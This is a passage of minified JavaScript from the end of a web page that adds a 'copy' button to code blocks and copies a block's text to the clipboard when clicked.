n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>